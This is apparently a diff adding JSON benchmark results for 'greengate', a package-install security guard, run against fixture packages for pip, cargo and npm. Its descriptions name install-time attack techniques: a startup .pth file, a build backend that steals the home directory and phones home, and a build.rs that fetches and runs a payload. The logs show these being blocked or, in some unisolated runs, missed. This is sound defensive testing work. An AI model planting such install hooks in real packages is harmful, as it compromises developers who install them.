+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 262ms\n\u2139\ufe0f  1 package(s) from private registries: release metadata not checked.\n\n\u26a0\ufe0f  install: 1 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] osv-db:npm \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:55539/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+        }
+      ]
+    },
+    {
+      "id": "pip-pth-wheel",
+      "label": "malicious",
+      "eco": "pip",
+      "description": "A wheel ships an executable .pth file that runs at every Python start",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.49,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.48,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.49,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.5,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.51,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.49,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/StartupCode"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/StartupCode] evilpth@1.0.0 \u2014 evilpth_init.pth runs at every Python start: writes files at Python start\n\u2139\ufe0f  Install halted before building or installing anything.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.57,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: evilpth@1.0.0: http://127.0.0.1:55663/pypi/evilpth/json: http://127.0.0.1:55663/pypi/evilpth/json: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:PyPI \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:55663/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was installed.\n"
+        }
+      ]
+    },
+    {
+      "id": "pip-sdist-backend",
+      "label": "malicious",
+      "eco": "pip",
+      "description": "An sdist whose build backend steals $HOME and phones home while pip resolves it",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 1.51,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82447-1791818595842968687/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 1.49,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82526-1791818599405568285/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 1.5,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82610-1791818602879390958/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "missed",
+            "exit_code": 0,
+            "seconds": 1.48,
+            "effect": true,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82689-1791818606393966354/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] evilbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "missed",
+            "exit_code": 0,
+            "seconds": 1.49,
+            "effect": true,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82764-1791818609861424206/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] evilbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "missed",
+            "exit_code": 0,
+            "seconds": 1.52,
+            "effect": true,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building evilbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-82839-1791818613311370296/built/evilbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: evilbuild\nSuccessfully installed evilbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] evilbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.7,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: evilbuild@1.0.0: http://127.0.0.1:60601/pypi/evilbuild/json: http://127.0.0.1:60601/pypi/evilbuild/json: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:PyPI \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:60601/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was installed.\n"
+        }
+      ]
+    },
+    {
+      "id": "cargo-build-rs",
+      "label": "malicious",
+      "eco": "cargo",
+      "description": "A crate whose build.rs shells out to download and run a payload",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.06,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.06,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.06,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.06,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.06,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.07,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousBuildScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded evil-build v1.0.0 (registry `fixture`)\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousBuildScript] evil-build@1.0.0 \u2014 its build script (build.rs) runs at `cargo build` with full access: curl \n\u2139\ufe0f  Cargo.toml and Cargo.lock were restored; do not build until the findings are resolved.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.03,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding evil-build v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 1 package to latest compatible version\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: evil-build@1.0.0: http://127.0.0.1:35739/api/v1/crates/evil-build: http://127.0.0.1:35739/api/v1/crates/evil-build: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:crates.io \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:35739/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: Cargo.toml and Cargo.lock were restored; nothing was fetched.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-prebuilt-download",
+      "label": "benign",
+      "eco": "npm",
+      "description": "A postinstall downloads a prebuilt binary (esbuild-style), allowlisted via script_network",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.68,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 228ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.62,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 209ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.62,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 210ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.64,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 212ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, 